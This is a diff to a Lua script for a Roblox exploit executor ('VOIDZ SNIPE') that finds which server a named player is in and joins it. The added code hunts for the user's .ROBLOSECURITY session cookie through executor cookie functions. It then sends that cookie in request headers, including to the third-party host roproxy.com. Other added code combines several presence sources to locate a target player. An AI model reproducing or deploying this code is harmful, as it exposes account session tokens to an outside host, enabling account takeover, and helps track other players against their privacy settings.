@@ -31,26 +31,126 @@ local function notify(text)
 	print("[VOIDZ SNIPE] " .. tostring(text))
 end
 
-local function httpReq(url, method, body)
-	local req = request or http_request or (syn and syn.request) or (http and http.request)
-	if type(req) == "function" then
-		local opts = {
-			Url = url,
-			Method = method or "GET",
-			Headers = {
-				["Content-Type"] = "application/json",
-				["Accept"] = "application/json",
-			},
-		}
-		if body then
-			opts.Body = body
+local cachedCookie, cookieTried
+local function cookieHeader()
+	if cookieTried then
+		return cachedCookie
+	end
+	cookieTried = true
+	local found
+	local function consider(v)
+		if found or v == nil then
+			return
 		end
-		local ok, res = pcall(req, opts)
-		if ok and type(res) == "table" then
-			return res.Body or res.body
+		if type(v) == "string" and #v > 10 then
+			if string.find(string.upper(v), "ROBLOSECURITY") then
+				found = v
+			elseif #v > 80 then
+				found = ".ROBLOSECURITY=" .. v
+			end
+		elseif type(v) == "table" then
+			for k, val in pairs(v) do
+				local ks, vs = tostring(k), tostring(val)
+				if string.find(string.upper(ks), "ROBLOSECURITY")
+					or string.find(string.upper(vs), "ROBLOSECURITY")
+					or string.find(vs, "_|WARNING") then
+					if string.find(string.upper(vs), "ROBLOSECURITY") then
+						found = vs
+					else
+						found = ".ROBLOSECURITY=" .. vs
+					end
+					return
+				end
+				if type(val) == "table" then
+					consider(val)
+				end
+			end
 		end
 	end
-	if (method or "GET") == "GET" then
+	local tries = {
+		function()
+			return getcookies(".roblox.com")
+		end,
+		function()
+			return getcookies("roblox.com")
+		end,
+		function()
+			return getcookies("https://www.roblox.com")
+		end,
+		function()
+			return getcookies("https://presence.roblox.com")
+		end,
+		function()
+			return getcookie(".ROBLOSECURITY")
+		end,
+		function()
+			return getcookie("https://www.roblox.com")
+		end,
+		function()
+			return syn.get_cookie()
+		end,
+		function()
+			return syn.get_cookies()
+		end,
+	}
+	for i = 1, #tries do
+		local ok, res = pcall(tries[i])
+		if ok then
+			consider(res)
+		end
+		if found then
+			break
+		end
+	end
+	cachedCookie = found
+	return found
+end
+
+local function httpReq(url, method, body)
+	method = method or "GET"
+	local req = request or http_request or (syn and syn.request) or (http and http.request)
+	local cookie = cookieHeader()
+	if type(req) == "function" then
+		local variants = {
+			{
+				Url = url,
+				Method = method,
+				Body = body,
+				Headers = {
+					["Content-Type"] = "application/json",
+					["Accept"] = "application/json",
+					["Cookie"] = cookie,
+				},
+			},
+			{
+				Url = url,
+				Method = method,
+				Body = body,
+				Headers = {
+					["Content-Type"] = "application/json",
+					["Accept"] = "application/json",
+				},
+			},
+			{
+				Url = url,
+				Method = method,
+				Body = body,
+			},
+		}
+		if not cookie then
+			table.remove(variants, 1)
+		end
+		for i = 1, #variants do
+			local ok, res = pcall(req, variants[i])
+			if ok and type(res) == "table" then
+				local raw = res.Body or res.body
+				if type(raw) == "string" and raw ~= "" then
+					return raw
+				end
+			end
+		end
+	end
+	if method == "GET" then
 		local ok, body2 = pcall(function()
 			return game:HttpGet(url)
 		end)
@@ -59,6 +159,239 @@ local function httpReq(url, method, body)
 		end
 	end
 	return nil
+end
+
+local function decodeJson(raw)
+	if type(raw) ~= "string" or raw == "" then
+		return nil
+	end
+	local ok, data = pcall(function()
+		return HttpService:JSONDecode(raw)
+	end)
+	if ok and type(data) == "table" then
+		return data
+	end
+	return nil
+end
+
+local function resolveUserId(name)
+	local uid
+	pcall(function()
+		uid = Players:GetUserIdFromNameAsync(name)
+	end)
+	if tonumber(uid) then
+		return tonumber(uid)
+	end
+	local payload = HttpService:JSONEncode({ usernames = { name }, excludeBannedUsers = false })
+	local data = decodeJson(httpReq("https://users.roblox.com/v1/usernames/users", "POST", payload))
+		or decodeJson(httpReq("https://users.roproxy.com/v1/usernames/users", "POST", payload))
+	if data and data.data then
+		for i = 1, #data.data do
+			local row = data.data[i]
+			if row and tonumber(row.id) then
+				return tonumber(row.id)
+			end
+		end
+	end
+	local q = name
+	pcall(function()
+		q = HttpService:UrlEncode(name)
+	end)
+	data = decodeJson(httpReq("https://users.roblox.com/v1/users/search?keyword=" .. q .. "&limit=10", "GET"))
+		or decodeJson(httpReq("https://users.roproxy.com/v1/users/search?keyword=" .. q .. "&limit=10", "GET"))
+	if data and data.data then
+		local want = string.lower(name)
+		for i = 1, #data.data do
+			local row = data.data[i]
+			if row and (string.lower(tostring(row.name or "")) == want or string.lower(tostring(row.displayName or "")) == want) then
+				return tonumber(row.id)
+			end
+		end
+	end
+	return nil
+end
+
+local function presenceFromHttp(uid)
+	local payload = HttpService:JSONEncode({ userIds = { uid } })
+	local urls = {
+		"https://presence.roblox.com/v1/presence/users",
+		"https://presence.roproxy.com/v1/presence/users",
+	}
+	local best
+	for i = 1, #urls do
+		local data = decodeJson(httpReq(urls[i], "POST", payload))
+		local list = data and (data.userPresences or data.UserPresences)
+		if type(list) == "table" then
+			local row
+			for j = 1, #list do
+				if tonumber(list[j].userId or list[j].UserId) == tonumber(uid) then
+					row = list[j]
+					break
+				end
+			end
+			row = row or list[1]
+			if row then
+				local ptype = tonumber(row.userPresenceType or row.UserPresenceType)
+				local placeId = tonumber(row.placeId or row.PlaceId or row.rootPlaceId or row.RootPlaceId)
+				local loc = row.lastLocation or row.LastLocation
+				-- Unauthenticated Roblox always returns type 0 + "Website". Don't treat that as real.
+				local stub = ptype == 0 and (loc == "Website" or loc == "website" or loc == nil or loc == "")
+				if ptype and (not stub or placeId) then
+					best = row
+					if ptype > 0 or placeId then
+						return row
+					end
+				elseif not best then
+					best = row
+				end
+			end
+		end
+	end
+	return best
+end
+
+local function presenceFromFriends(uid, name)
+	local list
+	pcall(function()
+		list = LP:GetFriendsOnline()
+	end)
+	if type(list) ~= "table" then
+		return nil
+	end
+	local want = string.lower(tostring(name or ""))
+	for i = 1, #list do
+		local f = list[i]
+		if type(f) == "table" then
+			local id = tonumber(f.VisitorId or f.UserId or f.Id)
+			local uname = string.lower(tostring(f.UserName or f.Username or f.Name or ""))
+			if id == tonumber(uid) or (want ~= "" and uname == want) then
+				return f
+			end
+		end
+	end
+	return nil
+end
+
+local function looksLikeJobId(s)
+	s = tostring(s or "")
+	if #s < 32 then
+		return false
+	end
+	return string.find(s, "%x%x%x%x%x%x%x%x%-%x%x%x%x%-%x%x%x%x%-%x%x%x%x%-%x%x%x%x%-%x%x%x%x%x%x%x%x%x%x%x%x") ~= nil
+end
+
+local function presenceFromEngine(uid)
+	local poke, a, b, c, d = pcall(function()
+		return TeleportService:GetPlayerPlaceInstanceAsync(uid)
+	end)
+	if not poke then
+		return nil
+	end
+	local placeId, jobId
+	if a == true and tonumber(c) then
+		placeId = tonumber(c)
+		jobId = tostring(d or b or "")
+	elseif looksLikeJobId(tostring(a)) and tonumber(c) then
+		placeId = tonumber(c)
+		jobId = tostring(a)
+	elseif tonumber(c) then
+		placeId = tonumber(c)
+		jobId = tostring(d or a or "")
+	elseif tonumber(a) then
+		placeId = tonumber(a)
+		jobId = tostring(b or "")
+	end
+	if not placeId then
+		return nil
+	end
+	return placeId, jobId
+end
+
+local function readPresence(uid, name)
+	local out = {
+		ptype = nil,
+		placeId = nil,
+		jobId = nil,
+		universeId = nil,
+		lastLocation = nil,
+		source = nil,
+	}
+	local engPlace, engJob = presenceFromEngine(uid)
+	if engPlace then
+		out.ptype = 2
+		out.placeId = engPlace
+		if looksLikeJobId(engJob) then
+			out.jobId = engJob
+		end
+		out.source = "engine"
+	end
+	local fr = presenceFromFriends(uid, name)
+	if fr then
+		local locType = tonumber(fr.LocationType)
+		local fPlace = tonumber(fr.PlaceId or fr.placeId)
+		local fJob = fr.GameId or fr.gameId
+		-- GetFriendsOnline: 1 mobile game, 4 PC game, 5 Xbox. 2 = website.
+		if fPlace then
+			out.ptype = 2
+			out.placeId = out.placeId or fPlace
+			if looksLikeJobId(fJob) then
+				out.jobId = out.jobId or tostring(fJob)
+			end
+			out.lastLocation = fr.LastLocation or fr.lastLocation or out.lastLocation
+			out.source = out.source or "friends"
+		elseif locType == 3 or locType == 6 then
+			if not out.ptype then
+				out.ptype = 3
+				out.source = "friends"
+			end
+		elseif locType == 2 or locType == 0 then
+			if not out.ptype then
+				out.ptype = 1
+				out.source = "friends"
+			end
+		end
+	end
+	local row = presenceFromHttp(uid)
+	if row then
+		local ptype = tonumber(row.userPresenceType or row.UserPresenceType)
+		local placeId = tonumber(row.placeId or row.PlaceId or row.rootPlaceId or row.RootPlaceId)
+		local jobId = row.gameId or row.GameId or row.gameInstanceId
+		local loc = row.lastLocation or row.LastLocation
+		local stub = ptype == 0 and (loc == "Website" or loc == "website") and not placeId
+		if not stub then
+			if ptype and ptype > (out.ptype or -1) then
+				out.ptype = ptype
+				out.source = "http"
+			elseif out.ptype == nil and ptype then
+				out.ptype = ptype
+				out.source = "http"
+			end
+			out.placeId = out.placeId or placeId
+			if looksLikeJobId(jobId) then
+				out.jobId = out.jobId or tostring(jobId)
+			end
+			if type(loc) == "string" and loc ~= "" and loc ~= "Website" then
+				out.lastLocation = out.lastLocation or loc
+			end
+			out.universeId = tonumber(row.universeId or row.UniverseId)
+		end
+		-- HTTP can still fill JobId/place even when engine already set InGame
+		if placeId then
+			out.placeId = out.placeId or placeId
+		end
+		if looksLikeJobId(jobId) then
+			out.jobId = out.jobId or tostring(jobId)
+		end
+		if out.ptype == 2 or placeId then
+			if type(loc) == "string" and loc ~= "" and loc ~= "Website" then
+				out.lastLocation = out.lastLocation or loc
+			end
+		end
+	end
+	if out.placeId and (out.ptype == nil or out.ptype == 0 or out.ptype == 4) then
+		out.ptype = 2
+	end
+	return out
 end
 
 local function gameNameFromIds(universeId, placeId)
@@ -92,14 +425,6 @@ local function gameNameFromIds(universeId, placeId)
 		end
 	end
 	return nil
-end
-
-local function looksLikeJobId(s)
-	s = tostring(s or "")
-	if #s < 32 then
-		return false
-	end
-	return string.find(s, "%x%x%x%x%x%x%x%x%-%x%x%x%x%-%x%x%x%x%-%x%x%x%x%-%x%x%x%x%x%x%x%x%x%x%x%x") ~= nil
 end
 
 local function copyText(s)
@@ -242,48 +567,49 @@ local function snipeName(name, status, jobBox, placeBox, gameLbl)
 		end
 
 		status.Text = "Looking up " .. name .. "..."
-		local uid
-		local okId = pcall(function()
-			uid = Players:GetUserIdFromNameAsync(name)
-		end)
-		if not okId or not uid then
+		local uid = resolveUserId(name)
+		if not uid then
 			status.Text = "User not found"
 			return
 		end
 
-		status.Text = "Fetching JobId..."
-		local payload = HttpService:JSONEncode({ userIds = { uid } })
-		local raw = httpReq("https://presence.roblox.com/v1/presence/users", "POST", payload)
-		if type(raw) ~= "string" or raw == "" then
-			raw = httpReq("https://presence.roproxy.com/v1/presence/users", "POST", payload)
-		end
-		if type(raw) ~= "string" then
-			status.Text = "Need request() for presence"
-			return
-		end
-
-		local okJ, data = pcall(function()
-			return HttpService:JSONDecode(raw)
-		end)
-		local pres = okJ and data and data.userPresences and data.userPresences[1]
-		if not pres then
-			status.Text = "Couldn't read presence"
-			print(raw)
-			return
-		end
-
-		local ptype = tonumber(pres.userPresenceType) or 0
-		local placeId = tonumber(pres.placeId or pres.rootPlaceId)
-		local jobId = pres.gameId or pres.gameInstanceId
+		status.Text = "Checking if they're in a game..."
+		local pres = readPresence(uid, name)
+		local ptype = tonumber(pres.ptype)
+		local placeId = tonumber(pres.placeId)
+		local jobId = pres.jobId
 		if not looksLikeJobId(jobId) then
 			jobId = nil
 		end
+		print("[VOIDZ SNIPE] " .. name .. " uid=" .. tostring(uid)
+			.. " type=" .. tostring(ptype)
+			.. " place=" .. tostring(placeId)
+			.. " job=" .. tostring(jobId and "yes" or "no")
+			.. " src=" .. tostring(pres.source))
 
-		if ptype == 0 then
-			status.Text = name .. " is offline"
-			if gameLbl then gameLbl.Text = "Game  ·  offline" end
+		if ptype == 2 and placeId then
+			local gname = pres.lastLocation
+			if type(gname) ~= "string" or gname == "" or gname == "Website" then
+				gname = gameNameFromIds(pres.universeId, placeId)
+			end
+			gname = gname or ("Place " .. tostring(placeId))
+			if gameLbl then
+				gameLbl.Text = "Game  ·  " .. gname
+			end
+			notify(name .. " is in " .. gname)
+			if not jobId then
+				status.Text = "In " .. gname .. " — no JobId (privacy)"
+				placeBox.Text = tostring(placeId)
+				return
+			end
+			jobBox.Text = tostring(jobId)
+			placeBox.Text = tostring(placeId)
+			copyText(tostring(jobId))
+			status.Text = "In " .. gname .. " — JobId copied, joining..."
+			joinJob(placeId, jobId, status, pres.universeId)
 			return
 		end
+
 		if ptype == 1 then
 			status.Text = name .. " is on the website, not in a game"
 			if gameLbl then gameLbl.Text = "Game  ·  Roblox website" end
@@ -294,33 +620,18 @@ local function snipeName(name, status, jobBox, placeBox, gameLbl)
 			if gameLbl then gameLbl.Text = "Game  ·  Roblox Studio" end
 			return
 		end
-		if ptype ~= 2 or not placeId then
-			status.Text = name .. " is not in a game"
-			if gameLbl then gameLbl.Text = "Game  ·  unknown" end
+		if ptype == 4 then
+			status.Text = name .. " is invisible — Roblox hides their game"
+			if gameLbl then gameLbl.Text = "Game  ·  invisible" end
 			return
 		end
-
-		local gname = pres.lastLocation
-		if type(gname) ~= "string" or gname == "" then
-			gname = gameNameFromIds(pres.universeId, placeId)
-		end
-		gname = gname or ("Place " .. tostring(placeId))
-		if gameLbl then
-			gameLbl.Text = "Game  ·  " .. gname
-		end
-		notify(name .. " is in " .. gname)
-
-		if not jobId then
-			status.Text = "In " .. gname .. " — no JobId (privacy)"
-			placeBox.Text = tostring(placeId)
+		if ptype == 0 then
+			status.Text = name .. " looks offline (or hides presence) — try again if they're in a game"
+			if gameLbl then gameLbl.Text = "Game  ·  hidden / offline" end
 			return
 		end
-
-		jobBox.Text = tostring(jobId)
-		placeBox.Text = tostring(placeId)
-		copyText(tostring(jobId))
-		status.Text = "In " .. gname .. " — JobId copied, joining..."
-		joinJob(placeId, jobId, status, pres.universeId)
+		status.Text = name .. " is not in a joinable game"
+		if gameLbl then gameLbl.Text = "Game  ·  unknown" end
 	end)
 end
 
